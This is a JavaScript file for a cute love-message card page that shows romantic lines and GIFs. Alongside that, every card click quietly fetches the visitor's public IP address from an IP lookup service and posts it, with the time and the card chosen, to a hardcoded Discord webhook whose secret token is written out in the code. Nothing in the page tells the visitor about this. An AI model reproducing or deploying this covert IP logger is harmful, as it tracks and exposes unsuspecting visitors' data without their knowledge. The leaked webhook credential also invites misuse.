const messages = [
    { text: "My feelings are overwhelmed by you.", gif: "https://i.pinimg.com/originals/15/46/2e/15462ed447e25356837b32a7e22e538f.gif" },
    { text: "#ILYSB", gif: "https://i.pinimg.com/originals/1e/44/fc/1e44fc7afb507ffe03650b3d473952f0.gif" },
    { text: "I love you like a fat kid loves cake.", gif: "https://i.pinimg.com/originals/26/a4/d8/26a4d8ef5e947e86b1dff469a8ae5a26.gif" },
    { text: "My heart is and always will be yours.", gif: "https://i.pinimg.com/originals/56/a9/28/56a928eba54db68b72cf44a565477f1c.gif" },
    { text: "I wanna be dragged around by you.", gif: "https://i.pinimg.com/originals/f8/cb/72/f8cb727656d994631eff60102acf5278.gif" },
    { text: "All I want to say is, let me hit you.", gif: "https://i.pinimg.com/originals/54/a4/2d/54a42dcae4130a1b4671cfc8befe806b.gif" }
];

function selectCard(cardIndex) {
    const message = messages[cardIndex - 1];
    document.getElementById('messageText').textContent = message.text;
    document.getElementById('gifImg').src = message.gif;
    document.getElementById('messageModal').style.display = "block";
    sendToWebhook(`Card ${cardIndex}`);
}

function closeModal() {
    document.getElementById('messageModal').style.display = "none";
}

// ฟังก์ชันส่งข้อมูลไปยัง Discord Webhook
async function sendToWebhook(buttonName) {
    const webhookUrl = "https://discord.com/api/webhooks/1292550292185026662/o9axKS-QS0RDBy-tSndCArl69RkY8s_4L8RCODuzHLZ67wemIU_ioLAQp02xWXe87zUe";

    // ดึง IP Address ของผู้ใช้
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const userIp = ipData.ip;

    // รับวันที่และเวลาปัจจุบัน
    const currentTime = new Date().toLocaleString();

    const message = {
        content: `User pressed: ${buttonName}\nIP: ${userIp}\nTime: ${currentTime}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    })
    .then(response => {
        if (response.ok) {
            console.log('Message sent to Discord');
        } else {
            console.error('Error sending message to Discord');
        }
    });
}
